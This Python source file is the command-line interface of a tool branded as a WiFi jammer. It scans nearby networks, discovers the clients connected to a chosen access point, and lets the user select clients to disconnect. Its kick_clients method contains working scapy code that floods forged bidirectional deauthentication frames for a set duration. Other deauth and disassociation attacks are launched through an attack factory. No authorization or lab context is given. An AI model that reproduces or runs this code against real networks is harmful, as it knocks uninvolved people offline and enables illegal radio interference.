#!/usr/bin/env python3
"""
Command-line interface for WiFi jamming tool.

Responsibilities are split across modules:

* ``cli.py`` — Click command wiring and the interactive session
  coordinator (:class:`WiFiJammerCLI`).
* ``cli_display.py`` — Rich rendering (:class:`AttackProgressDisplay`).
* ``cli_launcher.py`` — GUI/TUI launch helpers shared by every command.
"""

import sys
import os
import signal
import time
import threading
import click
from typing import Optional, List, Tuple, Dict, TYPE_CHECKING
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TimeElapsedColumn,
)
from rich.prompt import Prompt, Confirm
from rich.live import Live

from wifi_jammer.core.interfaces import AttackType, AttackConfig, IAttackStrategy
from wifi_jammer.core.platform_interface import PlatformInterfaceFactory
from wifi_jammer.scanner import ScapyNetworkScanner
from wifi_jammer.factory import AttackFactory
from wifi_jammer.utils import RichLogger
from wifi_jammer.utils.warning_suppressor import setup_warning_suppression
from wifi_jammer.utils.platform_utils import is_windows
from wifi_jammer.config import get_config_value
from wifi_jammer.utils.validators import (
    is_valid_interface_name,
    is_valid_channel,
    is_valid_packet_count,
    is_valid_delay,
    validate_attack_config,
)
from wifi_jammer.cli_display import AttackProgressDisplay
from wifi_jammer.cli_launcher import launch_gui, launch_tui

if TYPE_CHECKING:
    from wifi_jammer.attacks.base_attack import AttackStats
    from wifi_jammer.core.interfaces import NetworkInfo


# Setup warning suppression
setup_warning_suppression()


class WiFiJammerCLI:
    """Main CLI class for WiFi jamming tool."""

    def __init__(self) -> None:
        self.console = Console()
        self.logger = RichLogger()
        self.scanner = ScapyNetworkScanner(self.logger)
        self.factory = AttackFactory()
        self.current_attack: Optional["IAttackStrategy"] = None
        self.platform_interface = PlatformInterfaceFactory.create()
        self.progress_display: Optional[AttackProgressDisplay] = None
        self.live_display: Optional[Live] = None

    def check_root(self) -> bool:
        """Check if running as root. Returns True if root, False otherwise (warns but doesn't exit)."""
        if is_windows():
            # Windows - check for admin privileges
            try:
                import ctypes

                windll = getattr(ctypes, "windll", None)
                if windll is None or not windll.shell32.IsUserAnAdmin():
                    self.logger.warning(
                        "Some features may require administrator privileges on Windows."
                    )
                    return False
                return True
            except (AttributeError, OSError, ImportError):
                self.logger.warning("Could not check Windows privileges.")
                return False
        else:
            # Unix-like systems
            if os.geteuid() != 0:
                self.logger.warning(
                    "⚠️  Some features require root privileges. Run with sudo for full functionality."
                )
                self.logger.info(
                    "   Note: Network scanning may work without root, but attacks typically require root."
                )
                return False
            return True

    def show_banner(self) -> None:
        """Display tool banner."""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    WiFi Jammer Tool                          ║
║              Advanced WiFi Jamming Utility                   ║
║                    By Paijo - v1.0.0                        ║
╚══════════════════════════════════════════════════════════════╝
        """
        self.console.print(Panel(banner, style="cyan"))

    def list_interfaces(self) -> Optional[List[str]]:
        """List available wireless interfaces."""
        # Get all interfaces first
        all_interfaces = self.platform_interface.get_all_interfaces()
        wireless_interfaces = self.platform_interface.get_wireless_interfaces()

        if not all_interfaces:
            self.logger.error("No network interfaces found!")
            return None

        # Create table with all interfaces
        table = Table(title="Available Network Interfaces")
        table.add_column("Interface", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Type", style="blue")
        table.add_column("MAC Address", style="yellow")
        table.add_column("Capabilities", style="magenta")

        # Add all interfaces to table
        for iface in all_interfaces:
            capabilities = (
                ", ".join(iface.capabilities) if iface.capabilities else "None"
            )
            table.add_row(
                iface.name, iface.status, iface.type, iface.mac_address, capabilities
            )

        self.console.print(table)

        # Return only wireless interface names for further use
        wireless_names = [
            iface.name for iface in wireless_interfaces if iface.status == "Available"
        ]

        if not wireless_names:
            self.logger.warning("No available wireless interfaces found!")
            self.logger.info(
                "This tool requires wireless interfaces for full functionality."
            )
            return []

        return wireless_names

    def scan_networks(
        self, interface: str, channel: Optional[int] = None
    ) -> List["NetworkInfo"]:
        """Scan for available networks."""
        self.logger.info(f"Scanning networks on {interface}...")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
        ) as progress:
            task = progress.add_task("Scanning...", total=None)
            networks = self.scanner.scan_networks(interface, channel)
            progress.update(task, completed=True)

        return networks

    def display_networks(self, networks: List["NetworkInfo"]) -> None:
        """Display scanned networks in a table."""
        if not networks:
            self.logger.warning("No networks found!")
            return

        table = Table(title="Available Networks")
        table.add_column("SSID", style="cyan")
        table.add_column("BSSID", style="yellow")
        table.add_column("Channel", style="green")
        table.add_column("RSSI", style="red")
        table.add_column("Encryption", style="blue")

        for network in networks:
            table.add_row(
                network.ssid or "Hidden",
                network.bssid,
                str(network.channel),
                f"{network.rssi} dBm",
                network.encryption,
            )

        self.console.print(table)

    def select_network(self, networks: List["NetworkInfo"]) -> Optional["NetworkInfo"]:
        """Let user select a target network."""
        if not networks:
            return None

        choices = []
        for i, network in enumerate(networks, 1):
            choice = f"{i}. {network.ssid or 'Hidden'} ({network.bssid}) - Ch{network.channel}"
            choices.append(choice)

        self.console.print("\nSelect target network:")
        for choice in choices:
            self.console.print(f"  {choice}")

        while True:
            try:
                selection = Prompt.ask("Enter number", default="1")
                index = int(selection) - 1
                if 0 <= index < len(networks):
                    return networks[index]
                else:
                    self.logger.error("Invalid selection!")
            except ValueError:
                self.logger.error("Please enter a valid number!")

    def select_attack(self) -> AttackType:
        """Let user select attack type."""
        attacks = self.factory.get_available_attacks()

        self.console.print("\nAvailable attacks:")
        for i, attack in enumerate(attacks, 1):
            self.console.print(f"  {i}. {attack.value}")

        while True:
            try:
                selection = Prompt.ask("Select attack type", default="1")
                index = int(selection) - 1
                if 0 <= index < len(attacks):
                    return attacks[index]
                else:
                    self.logger.error("Invalid selection!")
            except ValueError:
                self.logger.error("Please enter a valid number!")

    def configure_attack(self, attack_type: AttackType) -> AttackConfig:
        """Configure attack parameters."""
        config = AttackConfig(
            attack_type=attack_type, target_bssid="", target_ssid="", channel=0
        )

        # Get target BSSID
        config.target_bssid = Prompt.ask("Target BSSID")

        # Get interface
        interfaces = self.scanner.get_interface_list()
        if interfaces:
            config.interface = Prompt.ask("Interface", default=interfaces[0])

        # Get channel
        channel = Prompt.ask("Channel", default="0")
        config.channel = int(channel) if channel.isdigit() else 0

        # Get packet count
        count = Prompt.ask("Packet count (0 for unlimited)", default="0")
        config.count = int(count) if count.isdigit() else 0

        # Get delay
        delay = Prompt.ask("Delay between packets (seconds)", default="0.1")
        config.delay = float(delay)

        # Get source MAC
        config.source_mac = Prompt.ask("Source MAC (random if empty)", default="")

        # Verbose mode
        config.verbose = Confirm.ask("Verbose mode?")

        return config

    def discover_clients(
        self,
        interface: str,
        ap_bssid: str,
        channel: Optional[int] = None,
        duration: int = 30,
    ) -> Tuple[Dict[str, float], Optional[str]]:
        """Discover clients connected to the AP."""
        # Get user's MAC to exclude
        import subprocess
        import re

        try:
            result = subprocess.run(
                ["ifconfig", interface], capture_output=True, text=True, timeout=5
            )
            mac_match = re.search(r"ether\s+([0-9a-fA-F:]+)", result.stdout)
            my_mac = mac_match.group(1) if mac_match else None
        except (
            subprocess.TimeoutExpired,
            subprocess.CalledProcessError,
            FileNotFoundError,
            OSError,
            AttributeError,
        ):
            my_mac = None

        # Use scanner's client scanning method
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console,
        ) as progress:
            task = progress.add_task(f"Scanning for {duration}s...", total=duration)

            def update_progress() -> None:
                for _ in range(duration):
                    time.sleep(1)
                    progress.update(task, advance=1)

            progress_thread = threading.Thread(target=update_progress)
            progress_thread.start()

            # Use scanner's scan_clients method
            clients = self.scanner.scan_clients(interface, ap_bssid, channel, duration)
            progress_thread.join()

        return clients, my_mac

    def select_clients_to_kick(self, clients: Dict[str, float]) -> List[str]:
        """Let user select which clients to kick."""
        if not clients:
            self.logger.warning("No clients discovered")
            return []

        # Display discovered clients
        table = Table(title=f"Discovered Clients ({len(clients)})")
        table.add_column("#", style="cyan")
        table.add_column("MAC Address", style="yellow")
        table.add_column("Last Seen", style="green")

        client_list = list(clients.items())
        for i, (mac, last_seen) in enumerate(client_list, 1):
            age = time.time() - last_seen
            table.add_row(str(i), mac, f"{age:.1f}s ago")

        self.console.print(table)

        self.console.print("\n[bold]Kick Options:[/bold]")
        self.console.print("  [cyan]all[/cyan] - Kick all discovered clients")
        self.console.print(
            "  [cyan]1,2,3[/cyan] - Kick specific clients (comma-separated)"
        )
        self.console.print("  [cyan]none[/cyan] - Skip client kicking")

        selection = Prompt.ask("Select clients to kick", default="all")

        if selection.lower() == "none":
            return []
        elif selection.lower() == "all":
            return [mac for mac, _ in client_list]
        else:
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(",")]
                return [client_list[i][0] for i in indices if 0 <= i < len(client_list)]
            except (ValueError, IndexError):
                self.logger.error("Invalid selection")
                return []

    def kick_clients(
        self,
        interface: str,
        ap_bssid: str,
        target_clients: List[str],
        duration: int = 60,
    ) -> None:
        """Kick specific clients using deauth packets."""
        from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
        from scapy.sendrecv import sendp

        if not target_clients:
            return

        self.logger.info(
            f"Kicking {len(target_clients)} clients for {duration} seconds..."
        )
        self.console.print("[yellow]Press Ctrl+C to stop early[/yellow]")

        start_time = time.time()
        count = 0

        try:
            with Live(
                self.console.status("[bold green]Sending deauth packets..."),
                console=self.console,
            ) as live:
                while time.time() - start_time < duration:
                    for target_mac in target_clients:
                        # Bidirectional deauth
                        pkt_to_client = (
                            RadioTap()
                            / Dot11(addr1=target_mac, addr2=ap_bssid, addr3=ap_bssid)
                            / Dot11Deauth(reason=7)
                        )

                        pkt_to_ap = (
                            RadioTap()
                            / Dot11(addr1=ap_bssid, addr2=target_mac, addr3=ap_bssid)
                            / Dot11Deauth(reason=7)
                        )

                        sendp(pkt_to_client, iface=interface, verbose=False)
                        sendp(pkt_to_ap, iface=interface, verbose=False)
                        count += 2

                    if count % 50 == 0:
                        elapsed = time.time() - start_time
                        live.update(
                            f"[bold green]Sent {count} packets to {len(target_clients)} clients ({elapsed:.1f}s)"
                        )

                    time.sleep(0.1)
        except KeyboardInterrupt:
            self.logger.info("Stopped by user")

        self.logger.success(f"Attack complete. Sent {count} deauth packets")

    def progress_callback(self, stats: "AttackStats") -> None:
        """Callback for progress updates."""
        if self.progress_display:
            self.progress_display.update_stats(stats)

    def start_attack(self, config: AttackConfig) -> None:
        """Start the attack with real-time progress display."""
        try:
            attack = self.factory.create_attack(config.attack_type)
            self.current_attack = attack

            # Set up progress callback
            attack.set_progress_callback(self.progress_callback)

            if attack.execute(config):
                self.logger.success("Attack started successfully!")

                # Create progress display
                self.progress_display = AttackProgressDisplay(self.console)

                # Start live display
                with Live(
                    self.progress_display.get_layout(), refresh_per_second=2
                ) as live:
                    self.live_display = live

                    try:
                        while attack.is_running():
                            time.sleep(0.5)
                    except KeyboardInterrupt:
                        self.stop_attack()

            else:
                self.logger.error("Failed to start attack!")

        except Exception as e:
            self.logger.error(f"Error starting attack: {e}")

    def stop_attack(self) -> None:
        """Stop the current attack."""
        if self.current_attack and self.current_attack.is_running():
            self.current_attack.stop()
            self.logger.info("Attack stopped by user")

    def signal_handler(self, signum: int, frame: Optional[object]) -> None:
        """Handle interrupt signals."""
        self.stop_attack()
        sys.exit(0)


@click.group(invoke_without_command=True)
@click.option("--verbose", "-v", is_flag=True, help="Verbose output")
@click.option("--gui", is_flag=True, help="Launch Qt GUI")
@click.option("--tui", is_flag=True, help="Launch modern TUI")
@click.pass_context
def cli(ctx: click.Context, verbose: bool, gui: bool, tui: bool) -> None:
    """Advanced WiFi Jamming Tool - By Paijo"""
    ctx.ensure_object(dict)
    ctx.obj["verbose"] = verbose
    ctx.obj["tui"] = tui
    ctx.obj["gui"] = gui

    # Launch GUI if requested (works standalone or with commands)
    if gui:
        launch_gui()

    # Launch TUI if requested (works standalone or with commands)
    if tui:
        launch_tui()

    # If no command and no gui/tui flag, show help
    if ctx.invoked_subcommand is None:
        click.echo(ctx.get_help())


@cli.command()
@click.option("--interface", "-i", help="Wireless interface to use")
@click.option("--channel", "-ch", type=int, help="Channel to scan")
@click.option("--gui", is_flag=True, help="Launch Qt GUI")
@click.option("--tui", is_flag=True, help="Launch modern TUI")
@click.pass_context
def scan(
    ctx: click.Context,
    interface: Optional[str],
    channel: Optional[int],
    gui: bool,
    tui: bool,
) -> None:
    """Scan for available WiFi networks."""
    # Check if GUI or TUI was requested (group level or command level)
    if ctx.obj.get("gui", False) or gui:
        launch_gui()

    if ctx.obj.get("tui", False) or tui:
        launch_tui(interface)

    cli_obj = WiFiJammerCLI()

    # Show banner
    cli_obj.show_banner()

    # Set up signal handlers
    signal.signal(signal.SIGINT, cli_obj.signal_handler)
    signal.signal(signal.SIGTERM, cli_obj.signal_handler)

    try:
        # List interfaces
        interfaces = cli_obj.list_interfaces()
        if not interfaces:
            return

        # Select interface if not provided
        if not interface:
            interface = Prompt.ask(
                "Select interface", choices=interfaces, default=interfaces[0]
            )

        # Scan networks
        networks = cli_obj.scan_networks(interface, channel)
        cli_obj.display_networks(networks)

    except KeyboardInterrupt:
        cli_obj.logger.info("Operation cancelled by user")
    except Exception as e:
        cli_obj.logger.error(f"Unexpected error: {e}")


@cli.command()
@click.option("--interface", "-i", help="Wireless interface to use")
@click.option("--target", "-t", help="Target BSSID")
@click.option(
    "--attack",
    "-a",
    type=click.Choice([at.value for at in AttackType]),
    help="Attack type",
)
@click.option(
    "--count",
    "-c",
    type=int,
    default=None,
    help="Number of packets to send (0 for unlimited); keeps prompted value when omitted",
)
@click.option(
    "--delay",
    "-d",
    type=float,
    default=None,
    help="Delay between packets in seconds; keeps prompted value when omitted",
)
@click.option("--channel", "-ch", type=int, help="Channel to use")
@click.option("--gui", is_flag=True, help="Launch Qt GUI")
@click.option("--tui", is_flag=True, help="Launch modern TUI")
@click.pass_context
def attack(
    ctx: click.Context,
    interface: Optional[str],
    target: Optional[str],
    attack: Optional[str],
    count: Optional[int],
    delay: Optional[float],
    channel: Optional[int],
    gui: bool,
    tui: bool,
) -> None:
    """Launch attack on a WiFi network."""
    # Check if GUI was requested (group level or command level)
    if ctx.obj.get("gui", False) or gui:
        launch_gui()

    # Check if TUI was requested (group level or command level)
    if ctx.obj.get("tui", False) or tui:
        launch_tui(interface)

    cli_obj = WiFiJammerCLI()

    # Check root privileges (warn but don't exit - some features may work without root)
    cli_obj.check_root()

    # Show banner
    cli_obj.show_banner()

    # Set up signal handlers
    signal.signal(signal.SIGINT, cli_obj.signal_handler)
    signal.signal(signal.SIGTERM, cli_obj.signal_handler)

    try:
        # List interfaces
        interfaces = cli_obj.list_interfaces()
        if not interfaces:
            return

        # Select interface if not provided
        if not interface:
            interface = Prompt.ask(
                "Select interface", choices=interfaces, default=interfaces[0]
            )

        # Select attack type
        if not attack:
            attack_type = cli_obj.select_attack()
        else:
            attack_type = AttackType(attack)

        # If target BSSID is provided, skip network scanning and use it directly
        if target:
            # Validate target BSSID format
            from wifi_jammer.utils.validators import is_valid_bssid

            if not is_valid_bssid(target):
                cli_obj.logger.error(f"Invalid target BSSID format: {target}")
                cli_obj.logger.info(
                    "BSSID format should be: XX:XX:XX:XX:XX:XX (hexadecimal)"
                )
                return

            # Validate interface if provided
            if interface and not is_valid_interface_name(interface):
                cli_obj.logger.error(f"Invalid interface name: {interface}")
                return

            # Validate channel if provided
            if channel and not is_valid_channel(channel):
                cli_obj.logger.error(
                    f"Invalid channel: {channel}. Must be 1-14 (2.4GHz) or 36-165 (5GHz)"
                )
                return

            # Validate count and delay (None = not provided on the command line;
            # interactive prompt answers must survive untouched)
            if count is not None and not is_valid_packet_count(count):
                cli_obj.logger.error(f"Invalid packet count: {count}. Must be >= 0")
                return

            if delay is not None and not is_valid_delay(delay):
                cli_obj.logger.error(
                    f"Invalid delay: {delay}. Must be between 0.0 and 60.0 seconds"
                )
                return

            # Create config directly from command-line parameters
            config = AttackConfig(
                attack_type=attack_type,
                target_bssid=target,
                target_ssid="",  # Not provided via CLI
                interface=interface,
                channel=channel if channel else 0,
                count=count if count is not None else 0,
                delay=delay if delay is not None else 0.1,
                source_mac="",  # Will be random if not provided
                verbose=ctx.obj.get("verbose", False),
            )

            # Final validation
            is_valid, error_msg = validate_attack_config(config)
            if not is_valid:
                cli_obj.logger.error(f"Invalid attack configuration: {error_msg}")
                return

            cli_obj.logger.info(f"Using provided target: {target}")
            if channel:
                cli_obj.logger.info(f"Using channel: {channel}")
            else:
                cli_obj.logger.warning(
                    "No channel specified. Attack may not work correctly on some interfaces."
                )
        else:
            # Interactive mode: scan and select network
            networks = cli_obj.scan_networks(interface, channel)
            cli_obj.display_networks(networks)

            # Select target network
            target_network = cli_obj.select_network(networks)
            if not target_network:
                return

            # Configure attack (interactive)
            config = cli_obj.configure_attack(attack_type)
            # Override with provided CLI values if any
            if interface:
                config.interface = interface
            if channel:
                config.channel = channel
            if count is not None:
                config.count = count
            if delay is not None:
                config.delay = delay
            config.verbose = ctx.obj.get("verbose", False)

        # Ask if user wants to discover and kick specific clients (only in interactive mode)
        if not target and attack_type in [AttackType.DEAUTH, AttackType.DISASSOC]:
            discover = Confirm.ask(
                "\n[bold cyan]Do you want to discover connected clients first?[/bold cyan]",
                default=False,
            )

            if discover:
                # Discover clients (using config values)
                clients, my_mac = cli_obj.discover_clients(
                    interface=config.interface,
                    ap_bssid=config.target_bssid,
                    channel=config.channel,
                    duration=30,
                )

                if clients:
                    # Let user select which clients to kick
                    target_clients = cli_obj.select_clients_to_kick(clients)

                    if target_clients:
                        # Ask for kick duration
                        duration_str = Prompt.ask(
                            "\n[bold]Kick duration in seconds[/bold]", default="60"
                        )
                        try:
                            duration = int(duration_str)
                        except ValueError:
                            duration = 60

                        # Kick selected clients
                        cli_obj.kick_clients(
                            interface=config.interface,
                            ap_bssid=config.target_bssid,
                            target_clients=target_clients,
                            duration=duration,
                        )

                        # Ask if user wants to continue with regular attack
                        continue_attack = Confirm.ask(
                            "\n[bold]Continue with regular attack?[/bold]",
                            default=False,
                        )
                        if not continue_attack:
                            return

        # Safety gate: ToolConfig.require_confirmation (TUI/GUI launches are
        # explicit button gestures; the CLI needs an explicit confirm here)
        if get_config_value("require_confirmation", True):
            if not Confirm.ask(
                "[bold red]Launch this attack now?[/bold red]", default=False
            ):
                cli_obj.logger.info("Attack cancelled by user")
                return

        # Start attack
        cli_obj.start_attack(config)

    except KeyboardInterrupt:
        cli_obj.logger.info("Operation cancelled by user")
    except Exception as e:
        cli_obj.logger.error(f"Unexpected error: {e}")


def main() -> None:
    """Main entry point for CLI."""
    cli()

if __name__ == "__main__":
    main()
